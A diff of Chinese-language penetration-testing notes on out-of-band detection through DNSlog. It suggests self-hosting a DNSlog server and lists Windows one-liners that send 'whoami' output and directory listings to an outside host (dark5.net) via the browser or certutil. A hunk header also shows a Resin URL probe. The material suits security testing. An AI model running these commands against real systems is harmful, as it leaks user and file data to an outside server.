@@ -214,6 +214,7 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 
 ## DNSlog平台的搭建
 &emsp;在我们实际的渗透中，我们不想使用一些别人家搭建的DNSlog平台，比较还是有可能被记录在别人的服务器上面的，这就涉及到保密的问题，那么就需要有自己可控的DNSlog平台。
+
 &emsp;这里推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项目主页是有搭建教程的，按自己的需求搭建。
 
 
@@ -222,6 +223,7 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 
 ## windows 
 `for /F %x in ('whoami') do start https://www.dark5.net/%x` #启动浏览器访问
+
 `for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #内置命令行工具访问
 
 `for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #只列出文件名
